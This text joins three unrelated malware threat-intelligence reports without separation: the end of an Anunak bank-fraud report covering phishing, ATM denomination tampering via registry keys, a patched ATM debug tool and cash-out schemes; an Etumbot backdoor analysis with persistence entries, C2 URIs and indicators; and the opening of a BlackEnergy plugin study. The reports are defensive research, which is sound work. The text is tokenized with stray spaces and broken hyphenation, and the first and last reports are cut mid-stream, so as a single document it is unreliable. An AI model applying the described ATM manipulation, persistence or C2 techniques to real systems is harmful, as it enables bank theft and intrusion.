An example of such emailing occurred on Septem- ber 25 , 2014 , at 14:11 , from the e - mail address `` Elina Shchekina < e.shekina @ rbkmoney.com > '' with the subject `` Updated agree- ment version '' .
The attachment '' agreement.doc '' exploits the vul- nerability CVE-2012 - 2539 and CVE-2012 - 0158 .
The emailing was conducted for more than 70 addresses of various compa- nies ( where multiple recipient addresses may be within one company ) .
The letter with malicious attachment ( md5 : AA36BA9F- 4DE5892F1DD427B7B2100B06 ) in the archive with a password from a potential client was sent to a bank manager after a pre- liminary telephone conversation with him .
The call origin is Saint Petersburg .
Contents of a text file named '' реквизиты.doc '' ( partner de- tais.doc ) '' Company Our Century '' , Ltd. 109387 , Russia , Moscow , Anosov str . , 24 , office 409 Tel .
( 495 ) 124 - 99 - 77 Fax : ( 495 ) 124 - 99 - 77 Mobile ( 962 ) 7135296 E - mail : x60x @ nxt .
ru INN 7329001307 KPP 732901001 Account 40702810613310001709 Branch of VTB 24 ( JSC ) , Moscow Correspondent account 30101810700000000955 BIC 043602955 A letter on behalf of the Central Bank of Russia with a malicious attachment ( md5 : 8FA296EFAF87FF4D- 9179283D42372C52 ) exploited the vulnerability CVE-2012- 2539 in order to execute arbi- trary code .
There were also other exam- ples of emails with malicious attachments , such as emailing with the file `` 001 . photo.exe '' .
A more detailed list of such attachments you can see in the Table `` Email attachments '' .
Availability of access to bank internal networks opens great opportunities for the hackers .
One of these opportunities is access to ATMs from spe- cial network segments that had to be isolated .
It is confirmed that this criminal group gained access to 52 ATMs .
The amount of damage exceeds 50 million rubles .
As a result of access to ATMs , depending on the ATM model , hackers used different patterns .
Having access , the attackers downloaded mali- cious scripts and changed denominations of issued banknotes in the ATM operating system registry .
As a result , for query to get 10 notes with denomination of 100 roubles the attackers received 10 banknotes with denomination of 5,000 roubles .
The used malicious script and program were developed for the platform Wincor .
The malicious script contains the following commands : Contents of the file `` 1.bat '' Execution of this file changed registry keys in the registry branch `` '' HKEY_LOCAL_MACHINE\ SOFTWARE\Wincor Nixdorf\ProTopas\Current- Version\LYNXPAR\CASH_DISPENSER '' '' that are responsible for cassette denominations in an ATM .
As a result of this file execution the registry key that is in charge of the cassette number 1 ( VALUE_1 ) is takes the value `` 100 '' , and the registry key respon- sible for the cassette number 4 ( VALUE_4 ) is set to '' 5000 '' .
Then the command to restart the computer is issued .
The registry key reference values : If the ATM actual load corresponds to the refer- ence one and registry keys have been changed , then the banknotes from the cassette No.1 will be issued with denomination `` 5000 '' instead of `` 100 '' .
In addition , the attackers used a modified debug program that allows by the command to issue mon- ey from the dispenser .
The original debug program issues money through the dispenser only when the open ATM housing and the vault door are fixed .
In order to ensure money issuance from the closed ATM the attackers had to modify the original program `` KDIAG32 '' ( the original file : size of 1,128,960 MD5 4CC1A6E049942EB- DA395244C74179EFF ) .
A comparison of the original version of the pro- gram with the modified version showed that the only difference is in ignoring error `` '' Door not opened or missing ! '' '' .
The figure below shows an error message that will be never displayed to the user in the file under investigation .
All traces found during investigation of one incident showed that the same criminal group had worked .
Ammy Admin was used for remote access , the same SSHD backdoor was installed on Unix servers and , In addi- tion , it was loaded from the same hacked server as in other cases of trojan Anunak usage .
However , in this case Androm- eda is used as the main trojan instead of Anunak .
The man- agement servers were located in Kazakhstan , Germany and Ukraine .
Check of the manage- ment servers showed that it was the hosting Bulletproof that , in addition to servers , provides a service of traffic proxying through its infrastructure as well as TOR and VPN usage , so this pattern is significantly differs from the Anunak host- ing patern .
Check of money cashout showed that the same cashout criminal group had worked as for Anunak and this fact again confirmed their cooperation .
Obtained Andromeda trojan copies were being distributed from August 2014 by e - mail .
The value 754037e7be8f61cbb1b85ab46c7da77d , which is the MD5 hash of the string `` go fuck yourself '' , was used as the RC4 encryption key .
As a result of this distri- bution from August to late October the Andromeda botnet rose up to 260,000 bots .
Successful infection in one subnet resulted in sending such letters to other bank employees .
Example of forwarding from an infected bank network to employees of another bank is shown below .
As a result of this radial mailing many oil and gas companies , banks and government agencies were in- fected .
In Russia at least 15 banks and two payment systems were infected this way .
Letters with similar attachments were being dis- tributed with the following subjects : `` My new photo '' `` Alert Transactions Report by users from 2014- 09 - 28 to 2014 - 09 - 28 '' Previously , it should be noted the fact that the process of stolen money withdrawal ( cashout ) was differed , firstly by the theft method , secondly by the victim type ( a bank or a payment system ) , thirdly by the total stolen sum .
The victims by their type were divided rather by counterparty types and by limitations imposed by operation with the counterparties .
For example , all payments were required to go through a certain pool of mediators .
In addition , the `` improper '' pool of counterparties could cause suspicion and unneces- sary testing ( manual processing of payment orders ) .
Bank ( amounts up to 100 million roubles ) : • When the attackers had obtained control of a bank operator workstation ( attacker purpose ) , they in general used a classic tree scheme when funds from the bank account were sent to several legal entities , then from each legal entity to smaller legal entities ( may be several such iter- ations ) and then to private person credit cards ( from 600 to 7000 transactions ) .
• When the attackers had obtained control of ATM management service ( attacker purpose ) , money were withdrawn directly from the ATM by the at- tacker command .
In this case the whole cashout process consisted in that a drop person had to be near the ATM at the specified time with a bag to empty the dispenser .
Bank ( amounts from 100 million roubles ) : • Money was sent to accounts of other banks , and cracked banks were often used where accounts and credit cards had been prepared in advance .
Payment system : • In addition to all the above methods , cash sending channels were also employed through the settlements systems , electronic wallets and payment systems , such as web money , Yandex Money , QIWI ( 1500 - 2000 transactions ) .
Reve- nues of large amounts ( up to 50 million roubles ) were recorded to particular cards of private per- sons who then used these cards to buy expensive small - sized goods such as jewelry , watches , and other attributes .
A huge part of the money was sent through mobile operators ( 1500 - 2000 SIM cards prepared in advance ) .
• In spring 2014 ( high time of this fraud type ) 2 cashout person groups were known who support- ed target attacks , by autumn 2014 their number increased to 5 .
In general , this increase was due to number of thefts too ( number of victims + average stolen sum per 1 victim ) .
The groups are working in different cities to ensure better cashout distribution .
Also these groups include immigrants from former Soviet republics who if necessary arrive in the required city .
Each group was monitored by a separate person .
Each group consists of about 15 - 20 people .
• Part of the money was transferred to Ukraine and Belarus .
While the attacks in Russia against banks and payment systems have occurred over the past two years , the attacks against the retail industry is only something which started in the second quarter of 2014 .
With at least three confirmed breaches where card track data was obtainedand a total of at least 16 breaches at retail organizations , it is also becoming a serious threat .
Apart from retail organizations it is also known that a number of media and PR companies have been breached in 2014 .
While it is not entirely cer- tain , the type of breaches suggest that the attackers are looking for inside information , a type of indus- trial espionage , allowing them to gain an advantage on the stock market .
As there is nothing specifically missing and the resulting fraud is hard to match with anything , these incidents typically are never linked .
From the retail perspective , the first infections in 2014 were sourced from a botnet which employs a widely deployed crypto - currency mining malware based on the Gozi / ISFB ( banking ) malware family .
Based on our insights we believe during the first half of 2014 over half a million systems had been compromised by this malware from over the whole world , however Russia and a number of post - Soviet states were clean of infections .
To find interesting infections within this large set of compromised systems , the malware extracts relevant information from the systems including Microsoft Windows organization registration information and network/ Windows domain information .
The Gozi / ISFB based malware was used to drop additional components on interesting systems , which included Metasploit / Meterpreter payloads and Anunak variants .
This was one of the main methods for the group using Anunak to obtain in- teresting infections in the middle of 2014 , sourcing infections from other botnet operators . More recent- ly other infection methods , including spear phishing using English language and possibly also usage of the teams own Andromeda , but also SQL injection to breach an organization directly from the outside , has been employed by this team .
The first known attacks with Anunak targeted a specific brand of POS systems which revolved around the Epicor / NSB brand .
To do this Anunak has specific code to target POS devices equipped with this software , which in contrary to the more common memory scanning track data scrapers , logs a wealth of information from the payments done by the cards .
The first case this was seen active was in July 2014 , but it might have been earlier as well .
More recent breaches have used a new custom developed POS malware , which is a more simple but reliable track data memory scraper .
The initial version from the early fall of 2014 used a simple blacklist , scraped every process and dumped track data in plain text .
More recent versions scanned only configuration specified processes and used RC4 to encrypt the extracted track data records on disk .
While the retail industry is one of its main targets due to its payment processing capabilities , other compromises might occur indirectly , for example to obtain databases with information or other informa- tion that is of value to the organized criminal group .
One of the possibilities is obtaining lists of corporate email addresses to have a higher chance of interest- ing infections .
At this moment we have no evidence of successful compromise or theft of banks and payment systems outside of Russia , but several infections in the east of Europe ( specifically Ukraine and Latvia ) were active in 2014 .
These specific infections were related to infrastructure of organizations based in Russia or with significant interests in Russia , thus more likely related to the breaches at the same organization in Russia .
The majority of infections from Europe were from dedicated servers used as exit node for VPN services , the systems infected were likely from Eastern Euro- pean or Russian origin , and possibly test infections from the attackers .
We have no evidence of compro- mises against banks in Western Europe or United States , but it should be noted that the attackers methods could be utilized against banks outside of Russia as well .
The group uses Metasploit as one of their main hacking tools , either stand alone or as part of a framework .
The activity includes port scanning and system reconnaissance , escalating privileges on systems by using for example the recent CVE-2014- 4113 vulnerability , gathering credentials and hop- ping on to other systems and networks .
Metasploit is being used to its full potential with scanning , exploiting , privilege escalation and post exploitation persistence being achieved with its standard toolset .
On interesting and critical systems typical hack- ing tools might be found to establish tunnels out of the network , either tools that are part of the Metasploit framework such as Meterpreter , but also other tools to achieve persistence on those systems .
The connect back methods seen are typically SSL over port 443 , but also DNS based methods were observed .
The attackers use BITS to download files , but also make use of Windows built - in PowerShell to download tools and execute commands .
Finally on the critical systems freshly crypted and non - detected versions of Anunak are deployed , typically these are used in very limited deployments thus their spread is limited and detection by Anti - Virus is very rare .
Various stealth methods including the aforemen- tioned backconnect SSL and DNS tunneling for compromise persistence and data exfiltration are used .
The Anunak malware has multiple ways of connecting to backends , which includes a PHP based backend reachable over HTTP and HTTPS , and a Windows server based component using a propri- etary protocol .
The use of VNC scanning and password brute forcing , the adding of additional administrator accounts , use of RDP Wrapper to allow concurrent RDP sessions are all methods to gain access and achieve persistent access to compromised systems employed by this group .
Additionally various ways of creating incidental and regular screen captures of the desktop of persons of interest within com- promised organizations were methods employed by these attackers .
This also includes video captures made by the Anunak malware , allowing attackers to observe the behavior of users of certain applications .
Group - IB is one of the leading international companies specializing in preventing and investigat- ing high - tech cyber crimes and fraud .
The company offers a range of services on preventing financial and reputational damages , consulting and auditing of information security systems , and on computer forensics .
The company also develops a number of innovative software products used to monitor , detect and prevent emerging cyber threats .
The Group - IB team is made up of experts with unique skills and solid practical experience .
They are internationally certified by CISSP , CISA , CISM , CEH , CWSP , GCFA and also have information security state certificates .
In 2013 , computer secu- rity incident response team CERT - GIB operated by Group - IB became a member of FIRST - Forum of Incident Response and Security Teams .
In 2013 , the company became a member of the international cyber security alliance IMPACT ( In- ternational Multilateral Partnership Against Cyber Threats ) .
www.group-ib.com Fox - IT creates innovative cyber security solutions for a more secure society .
We are dedicated to our clients , our values , and our integrity .
Fox - IT delivers solutions before , during and after attacks .
InTELL is the real - time cyber intelligence product from Fox - IT .
It provides a layered intelligence approach : actionable data feeds into operational risk decision systems .
Real time threat information allows for tactical decisions and mitigation .
InTELL provides a full real - time insight in the global threat landscape .
We base our intelligence around actor attribu- tion .
This angle drives a unique visibility on online threats - InTELL sees threats before they enter the botnet .
Information is delivered through our col- laboration portal , alerting , and through automated feeds powered by industry standard transports .
Arbor Threat Intelligence Brief 2014 - 07 ASERT Threat Intelligence , June 2014 Etumbot is a backdoor used in targeted attacks since at least March 2011 .
Although previous research has covered a related family , IXESHE , little has been discussed regarding Etumbot 's capabilities .
ASERT has observed several Etumbot samples using decoy documents involving Taiwanese and Japanese topics of interest , indicating the malware is used in ongoing , targeted campaigns .
This report will provide information on the capabilities of Etumbot and associated campaign activity .
Etumbot is a backdoor malware that has been associated with a Chinese threat actor group alternatively known as `` Numbered Panda '' , APT12 , DYNCALC / CALC Team , and IXESHE .
Targeted campaigns attributed to this group include attacks on media , technology companies , and governments .
IXESHE / Numbered Panda is known for using screen saver files ( .scr
) , a technique repeated with the Etumbot malware .
[ 1 ] A previous campaign using IXESHE malware was highlighted in 2012 ; the group used targeted emails with malicious PDF attachments to compromise East Asian governments , Taiwanese electronics manufacturers , and a telecommunications company .
The group has reportedly been active since at least July 2009 .
[ 2 ] Etumbot has also been referred to as Exploz [ 3 ] and Specfix .
The variety of names for this malware could lead to some confusion about the actual threat .
ASERT has associated Etumbot with IXESHE , and therefore Numbered Panda , based on similar system and network artifacts that are common between the malware families .
For example , both malware families have been seen using the same ka4281x3.log and kb71271.log files , both families have been observed calling back to the same Command & Control servers and have been used to target similar victim populations with similar attack methodologies .
Etumbot has two primary components .
The first is a dropper which contains the backdoor binary ( the second component ) and the distraction file .
Stage one is likely delivered via spear phish using an archive file extension such as .7z
to deliver executable content .
Stage one has been seen to leverage the Unicode Right to Left Override trick combined with convincing icons for various types of PDFs or Microsoft Office documents to convince the user to click and therefore execute the malware , which then runs the backdoor and displays the distraction file .
As with the IXESHE malware , Etumbot has been observed dropping documents of interest to a Taiwanese and Japanese target population .
To profile the techniques and capabilities of Etumbot , we will analyze an Etumbot dropper with MD5 ff5a7a610746ab5492cc6ab284138852 and a compile date of March 4 , 2014 .
When executed , the dropper loads up a resource named `` BINARY '' from the resource section then creates the directory C : \Documents and Settings\User\Application Data\JAVA , then creates a temporary file C : \DOCUME~1\User\LOCALS~1\Temp\ka4281x3.log then creates C : \Documents and Settings\User\Application Data\JAVA\JavaSvc.exe from the aforementioned BINARY resource .
This file , JavaSvc.exe , is the backdoor component ( MD5 82d4850a02375a7447d2d0381b642a72 ) .
JavaSvc.exe is executed with CreateProcessInternalW .
The backdoor component of the malware ( named here as JavaSvc.exe ) is now running .
It is interesting to note that versions of the IXESHE malware also used JavaSvc.exe as a filename .
Most Etumbot samples observed by ASERT drop decoy documents ( PDFs , Word Documents , and Excel Spreadsheets ) written in Traditional Chinese and usually pertaining to Cross - Strait or Taiwanese Government interests .
Several decoy files contain details on upcoming conferences in Taiwan .
Etumbot appears to be sent to targets via spear phishing emails as an archive ; ASERT has observed .7z
and .rar
formats being used to presumably deliver the Etumbot installer .
The archive filename will have a topic most likely of interest to the victim .
At least one identified malware sample ( 75193fc10145931ec0788d7c88fc8832 , compiled in March 2014 ) uses a password - protected .7z
to deliver the Etumbot installer .
It is most likely that the spear phish email contained the password .
With the correct password , the victim has access to the dropper inside the archive .
This archive most likely included the installer d444be30d2773b23de38ead1f2c6d117 , as the filenames match ( 1030522 新 機關籌備小組清單.7z and 1030522 新機關籌備小組清單 rcs . DOC ) .
1030522 is a date ( May 22 , 2014 ) from the Minguo calendar , which is unique to Taiwan .
The calendar is based on the establishment of the rd Republic of China in 1911 .
2014 is therefore the `` 103 `` year of the ROC .
The installer is a .scr
binary posing as a Word Document .
This dropper drops a decoy document and the backdoor , named sysupdate.exe in this instance .
Right - to - Left Override After the files are extracted from the archive , the filenames of Etumbot installers make use of the right - to - left override ( RTLO ) trick in an attempt to trick users into clicking on the installer .
The RTLO technique is a simple way for malware writers to disguise names of malicious files .
A hidden Unicode character in the filename will reverse the order of the characters that follow it , so that a .scr
binary file appears to be a .xls
document , for example .
Threat actors using this trick have been well documented since at least 2009 .
[ 4- 5 ] One way to avoid this trick in Windows is to set the `` Change your view '' level to `` Content '' .
[ 6 ] Below are some of the names of Etumbot installers using RTLO successfully : As the backdoor executes from our previous example , C : \DOCUME~1\User\LOCALS~1\Temp\ kb71271.log is created and contains the following registry file to make the malware persistent : [ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run ] `` JavaSvc '' = '' C : \\Documents and Settings\\User\\Application Data\\JAVA\\JavaSvc.exe '' The dropper then calls regedit with kb71271.log as a parameter to modify the registry .
kb71271.log is then deleted .
These temp files appear to be static and used across multiple samples of Etumbot and IXESHE .
Various other samples were found using this same naming scheme .
Next , C : \DOCUME~1\User\LOCALS~1\Temp\ka4281x3.log is created , filled with contents of the bait / distraction file , and then copied to C : \DOCUME~1\User\LOCALS~1\Temp\~t3fcj1.doc , which is then opened .
If Word is n't installed , then notepad will open the file instead .
The ka4281x3.log file is then deleted .
Returning to the first sample , once the dropper ( ff5a7a610746ab5492cc6ab284138852 ) installs the Etumbot backdoor ( 82d4850a02375a7447d2d0381b642a72 ) , an initial HTTP beacon is sent to the Command & Control server that requests an RC4 encryption key .
The beacon takes the form of a GET request to /home / index.asp ? typeid = N where N is a randomly selected odd number between 1 and 13 .
If the C & C is online , the decoded response payload will contain the RC4 key that is used to encrypt subsequent communication .
If the C & C does not send a valid response , the bot will re - send the initial request every 45 seconds .
While the user - agent may appear to be legitimate , it only occurred 39 times in a corpus of over 61 million HTTP requests .
Due to the possibility of this User - Agent appearing in legitimate traffic , other indicators – such as the additional fake Referer value of http : //www.google.com should be present before compromise is assumed .
All of the headers in the HTTP request are hard - coded in both order and value , so they may be used to provide additional indicators of compromise .
If the C & C is online and responds to the beacon , then the RC4 key is delivered to the bot in a string of base64 encoded characters .
Etumbot uses a url - safe base64 alphabet , i.e. , any characters that would require URL - encoding are replaced .
Usage of base64 is a technique consistent with previous analysis done on IXESHE malware .
[ 2,7 ] In the case of Base64 , the `` / '' and `` = '' characters are replaced with `` _ '' and `` - '' respectively .
The payload from the C & C contains an 8-byte command code in little - endian format , followed by a null - terminated string argument if the command requires it .
In the case of the initial beacon response , the RC4 key is located after the command code and has been observed to be e65wb24n5 for all live C & C 's that ASERT has analyzed .
An example of this initial beacon and delivery of RC4 key is as follows .
The RC4 key can be obtained from the C & C response with the following python : While a payload of 1080 bytes is sent back , the majority appears to be random padding .
Once the bot has received the encryption key , the bot sends a registration callback to the C & C /image/ < encrypted data > .jpg
containing the encrypted values of system information to include the NetBIOS name of the system , user name , IP address , if the system is using a proxy ( Yes / No ) , and a numeric value which may be some type of campaign code .
IXESHE malware has also been observed using a unique campaign code that is delivered back to the C & C .
[ 7 ] Etumbot discovers the proxy settings of the local machine .
If a proxy is defined , communications to the C & C bypass the proxy and go directly to the Internet .
Environments with system - defined proxies wo n't get this activity in proxy logs , however transparent proxies may see this activity .
A contrived example of this registration string generated by the Etumbot backdoor prior to encryption is as follows : WINXPBOX|johnsmith|10.0.1.15|No Proxy|05147| Once the bot has registered with the C & C , it will send periodic pings to ask for new commands to execute .
The URI for the ping requests is /history/ < encrypted NetBIOS name > .asp
, where encrypted NetBIOS name is the url - safe base64 encoding of the rc4-encrypted NetBIOS name .
The first eight bytes of C & C responses to the bot include the command , and the second eight bytes contain an ASCII string that is parsed .
In the event of a file download , file upload , or command execution , the second eight bytes contain the filename or command to be executed .
The parsing function inside the binary reveals at least five commands : ETUM_CMD_EXEC provides the capability for the attacker to run any command on the compromised hosts .
Both stdout and stderr from the command are redirected to a pipe and are then relayed back to the C & C using a separate thread that spawned during initialization .
In the event of a process creation or hang error , an HTTP transaction to /tech / s.asp / m= < message > is sent to the C & C , where < message > contains a create process error statement `` CreateProcess Error : % d '' or a message that states `` Process Do not exit in 10 second , so i Kill it ! '' .
Some samples of droppers have been observed using the string `` Process Do not cunzai in 10 second , so i Kill it ! '' .
The word `` cunzai '' is likely the pinyin ( romanization ) for the Mandarin word ' exist ' .
ETUM_CMD_PUTFILE provides the capability for files to be placed on local system from the C & C .
The file upload is accomplished by sending a request to /docs / name= < data > and the C & C is expected to respond with the full contents of the file as the response payload .
A success or failure status message is relayed via a call to /tech / s.asp ? m= < encrypted status message > with various reasons for failure potentially being relayed .
ETUM_CMD_READFILE allows any file from the compromised system to be uploaded to the C & C .
When a READFILE command is received from the C & C , the bot makes an initial call to /manage / asp / item.asp ? id= < encrypted computer name > & & mux= < encrypted total file size > and checks for the presence of `` I ' m Ready '' in the response from the C & C .
Data from the file is read in 2000 byte chunks , RC4 encrypted and then url - safe base64 encoded .
The data is sent back to the C & C via the URI /article/30441/Review.asp ? id= < encoded computer name > & & date= < file chunk data > .
The bot expects a message of `` OK '' from the C & C after each response is sent and will terminate the upload and send an error message to the C & C in the case it is not seen .
A success or failure message is sent via the /tech / s.asp ? m= < encrypted status message > to complete or terminate the upload .
ETUM_CMD_SLEEP puts the bot into a dormant state for a period of time .
When a bot receives the sleep command , it will relay the message , `` I will sleep % d minutes ! '' via a call to /tech / s.asp ? m= < encrypted message > .
ETUM_CMD_UNINSTALL deletes the binary and terminates the process with no additional communication to the C & C .
Etumbot uses a technique to load strings into memory that has been called `` byte strings '' and also `` string stacking '' whereby character values are loaded into a specific memory location one byte at a time .
Assuming the string values do not change frequently , these byte strings can make for meaningful detection capabilities , such as discovering an unusual combination of characters ( to include typos , unique or odd syntax ) being loaded into memory that creates a unique fingerprint for the malware activity that can be used as part of a yara rule or other detection mechanism .
The byte string technique has been observed in various Chinese APT malware , including Gh0st RAT , IXESHE malware , Etumbot and others .
ASERT has provided an IDApython script that will provide for cleaner analysis of such strings as well as a corresponding blog entry that describes the obfuscation technique and code .
[ 8 - 9 ] The output of running find_byte_strings.py on an Etumbot backdoor shows the string `` I ' m Ready '' which is involved in file transfer routines .
The first screenshot shows the default hex byte values that are MOVed into offsets from EBP , and the second screenshot shows those same characters after translation to string values .
Two additional screenshots provide insight into all of the strings discovered .
The byte string technique has also been observed in other malware , so its presence alone does not specifically indicate the activities of Chinese threat actors .
An interesting artifact occasionally observed during analysis is the presence of a numeric value just after an IP address used as a C & C .
The placement of this number after a colon suggests the use of a port value , however such a port value is too high to be valid .
An example of this taken from an Etumbot sample performing an initial beacon is as follows : 11 Most instances of Etumbot that were analyzed connect directly to an IP address with the IP address hardcoded in the binary .
These C & C 's were obtained from analyzing malware samples compiled over a period of several years .
A number of these C & C IP addresses are also used by IXESHE - related malware , which seems to indicate that Etumbot is often used in tandem with IXESHE .
The domain finance [ .
] yesplusno [ .
] com and IP address 211 [ .
] 53.164.152 was also used by a variety of IXESHE samples , for instance .
The registrant for the domain yesplusno [ .
] com is listed as `` alice yoker '' wit the email address `` chuni_fan @ sina.com '' .
Other domains registered in this name have also been used as C & C for IXESHE : securezone [ .
] yesplusno [ .
] com [ 10 ] prishmobile [ .
] googlesale [ .
] net yahoopush [ .
] googlesale [ .
] net The IP address 98.188.111.244 has also been used as a C & C for multiple IXESHE samples , beginning in at least March 2013 and observed as recently as March 2014 with an Etumbot sample .
This is the IP address for what appears to be a legitimate website for a school in Taiwan : intro.sunnyschool.com.tw .
Note that if HTran or other connection bouncer is used , the C & C may be a legitimate site that was simply compromised and used to direct traffic elsewhere .
Indicators suggest that HTran , a connection bouncer , is being used in some cases such as on the C & C contacted by malware sample MD5 : 1ce47f76fca26b94b0b1d74610a734a4 ( compilation date March 12 , 2014 ) .
The presence of HTran is based on the following response string HTran is also called `` HUC Packet Transmit Tool '' , developed by a member of the Honker Union of China , a hacker group ; the source code for the program is available online .
[ 11 ] HTran is designed to redirect TCP traffic intended for one host to another , and has been used by IXESHE malware previously .
[ 2 ] Researchers at SecureWorks determined some years back that HTran would deliver the IP address of the final destination server if the final server were down or unreachable .
The code in use here has been modified to not reveal such information .
Organizations properly positioned with netflow or other traffic analysis capabilities may be able to locate upstream servers from HTran nodes that operate as the initial tier of C & C .
Htran activity can be detected with the following signature : ET CURRENT_EVENTS HTran / SensLiceld . A response to infected host The import hash for the sample observed connecting to an Htran bouncer is a9059c354e5025dfe4f1c0b8b57e4f62 which links to other Etumbot samples compiled with Microsoft Visual C++ 5.0 in a similar March 2014 timeframe : • 4c703a8cfeded7f889872a86fb7c70cf 2014 - 03 - 24 • ff5a7a610746ab5492cc6ab284138852 2014 - 03 - 04 The following samples have been identified by ASERT as Etumbot malware .
The first identified sample has a compilation date of March 2011 , while the most recent was compiled in May 2014 .
Many droppers / installers contain Etumbot or , alternatively , IXESHE - related backdoors .
Most of the documents dropped with Etumbot are written in traditional Chinese .
Traditional Chinese ( versus simplified Chinese used in mainland China ) is most widely used in Taiwan .
While other areas do make use of traditional Chinese ( Hong Kong , Macau ) , the topics of the decoy documents strongly suggest that Taiwanese entities are the targets for many Etumbot samples .
A recent increase in Etumbot samples with configuration dates of 2014 seems to indicate that the Numbered Panda / IXESHE group has increased activity lately or has begun using Etumbot more widely in targeted campaigns .
[ 1 ] http : //www.crowdstrike.com / blog / whois - numbered - panda/ [ 2 ] http : //www.trendmicro.com / cloud - content / us / pdfs / security - intelligence / white - papers / wp_ixeshe.pdf [ 3 ] http : //www.symantec.com / security_response / writeup.jsp ? docid=2013 - 080921 - 5219 - 99 & tabid=2 [ 4 ] https : //blog.commtouch.com / cafe / malware / exe - read - backwards - spells - malware/ [ 5 ] http : //threatpost.com / sirefef - malware - found - using - unicode - right - to - left - override - technique/102033 [ 6 ] http : //blog.malwarebytes.org / online - security/2014/01/the - rtlo - method/ [ 7 ] http : //www.fireeye.com / blog / technical/2013/08/survival - of - the - fittest - new - york - times - attackers - evolve- quickly.html [ 8 ] https : //github.com / arbor / reversing / blob / master / find_byte_strings.py [ 9 ] http : //www.arbornetworks.com / asert/2013/07/asert - mindshare - finding - byte - strings - using - idapython/ [ 10 ] https : //www.symantec.com / security_response / writeup.jsp ? docid=2014 - 011500 - 2419 - 99 & tabid=2 [ 11 ] http : //read.pudn.com / downloads199/sourcecode / windows/935255/htran.cpp__.htm The Arbor Security Engineering & Response Team ( ASERT ) at Arbor Networks delivers world - class network security research and analysis for the benefit of today 's enterprise and network operators .
ASERT engineers and researchers are part of an elite group of institutions that are referred to as `` super remediators , '' and represent the best in information security .
This is a reflection of having both visibility and remediation capabilities at a majority of service provider networks globally .
ASERT shares operationally viable intelligence with hundreds of international Computer Emergency Response Teams ( CERTs ) and with thousands of network operators via intelligence briefs and security content feeds .
ASERT also operates the world¹s largest distributed honeynet , actively monitoring Internet threats around the clock and around the globe via ATLAS® , Arbor 's global network of sensors : http : //atlas.arbor.net .
This mission and the associated resources that Arbor Networks brings to bear to the problem of global Internet security is an impetus for innovation and research .
To view the latest research , news , and trends from Arbor , ASERT and the information security community at large , visit our Threat Portal at http : //www.arbornetworks.com / threats/ .
The BlackEnergy malware is crimeware turned APT tool and is used in significant geopolitical operations lightly documented over the past year .
An even more interesting part of the BlackEnergy story is the relatively unknown custom plugin capabilities to attack ARM and MIPS platforms , scripts for Cisco network devices , destructive plugins , a certificate stealer and more .
Here , we present available data - it is difficult to collect on this APT .
We will also present more details on targets previously unavailable and present related victim profile data .
These attackers are careful to hide and defend their long - term presence within compromised environments .
The malware 's previously undescribed breadth means attackers present new technical challenges in unusual environments , including SCADA networks .
Challenges , like mitigating the attackers ' lateral movement across compromised network routers , may take an organization 's defenders far beyond their standard routine and out of their comfort zone .
BlackEnergy2 and BlackEnergy3 are known tools .
Initially , cybercriminals used BlackEnergy custom plugins for launching DDoS attacks .
There are no indications of how many groups possess this tool .
BlackEnergy2 was eventually seen downloading more crimeware plugins - a custom spam plugin and a banking information stealer custom plugin .
Over time , BlackEnergy2 was assumed into the toolset of the BE2/Sandworm actor .
While another crimeware group continues to use BlackEnergy to launch DDoS attacks , the BE2 APT appears to have used this tool exclusively throughout 2014 at victim sites and included custom plugins and scripts of their own .
To be clear , our name for this actor has been the BE2 APT , while it has been called `` Sandworm Team '' also .
Before evidence of BlackEnergy2 use in targeted attacks was uncovered , we tracked strange activity on one of the BlackEnergy CnC servers in 2013 .
This strangeness was related to values listed in newer BlackEnergy configuration files .
As described in Dmitry 's 2010 Black DDoS ' analysis , a configuration file is downloaded from the server by main.dll on an infected system .
The config file provides download instructions for the loader .
It also instructs the loader to pass certain commands to the plugins .
In this particular case in 2013 , the config file included an unknown plugin set , aside from the usual ' ddos ' plugin listing .
Displayed below are these new , xml formatted plugin names `` weap_hwi '' , `` ps '' , and `` vsnet '' in a BlackEnergy configuration file download from a c2 server .
This new module push must have been among the first for this group , because all of the module versions were listed as `` version 1 '' , including the ddos plugin : The ' ps ' plugin turned out to be password stealer .
The ' vsnet ' plugin was intended to spread and launch a payload ( BlackEnergy2 dropper itself at the moment ) in the local network by using PsExec , as well as gaining primary information on the user 's computer and network .
Most surprising was the ' weap_hwi ' plugin .
It was a ddos tool compiled to run on ARM systems : At first , we did n't know whether the ARM plugin was listed intentionally or by mistake , so we proceeded to collect the CnC 's config files .
After pulling multiple config files , we confirmed that this ARM object inclusion was not a one - off mistake .
The server definitely delivered config files not only for Windows , but also for the ARM / MIPS platform .
Though unusual , the ARM module was delivered by the same server and it processed the same config file .
Over time we were able to collect several plugins as well as the main module for ARM and MIPS architectures .
All of these ARM / MIPS object files were compiled from the same source and later pushed out in one config : `` weap_msl '' , `` weap_mps '' , `` nm_hwi '' , `` nm_mps '' , `` weap_hwi '' , and `` nm_msl '' .
It 's interesting that the BE2 developers upgraded the ddos plugin to version 2 , along with the nm_hwi , nm_mps , and nm_msl plugins .
They simultaneously released version 5 of the weap_msl , weap_mps , and weap_hmi plugins .
Those assignments were not likely arbitrary , as this group had developed BlackEnergy2 for several years in a professional and organized style : Here is the list of retrieved files and related functionality : The developers ' coding style differed across the ' Hook ' main module , the plugins , and the Windows main.dll .
The hook main module contained encrypted strings and handled all the function calls and strings as the references in a large structure .
This structure obfuscation may be a rewrite effort to better modularize the code , but could also be intended to complicate analysis .
Regardless , it is likely that different individuals coded the different plugins .
So , the BE2 effort must have its own small team of plugin and multiplatform developers .
After decrypting the strings , it became clear that the Linux Hook main module communicated with the same CnC server as other Windows modules : This Linux module can process the following commands , some of which are similar to the Windows version : After the disclosure of an unusual CnC server that pushed Linux and the new Windows plugins we paid greater attention to new BE2 samples and associated CnCs .
During an extended period , we were able to collect many Windows plugins from different CnC servers , without ever noticing Linux plugins being downloaded as described above .
It appears the BE2/SandWorm gang protected their servers by keeping their non - Windows hacker tools and plugins in separate servers or server folders .
Finally , each CnC server hosts a different set of plugins , meaning that each server works with different victims and uses plugins based on its current needs .
Here is the summary list of all known plugins at the moment : We are pretty sure that our list of BE2 tools is not complete .
For example , we have yet to obtain the router access plugin , but we are confident that it exists .
Evidence also supports the hypothesis that there is a decryption plugin for victim files ( see below ) .
Our current collection represents the BE2 attackers ' capabilities quite well .
Some plugins remain mysterious and their purpose is not yet clear , like ' usb ' and ' bios ' .
Why would the attackers need information on usb and bios characteristics ? It suggests that based on a specific USB and BIOS devices , the attackers may upload specific plugins to carry out additional actions .
Perhaps destructive , perhaps to further infect devices .
We do n't know yet .
It 's also interesting to point out another plugin – ' grc ' .
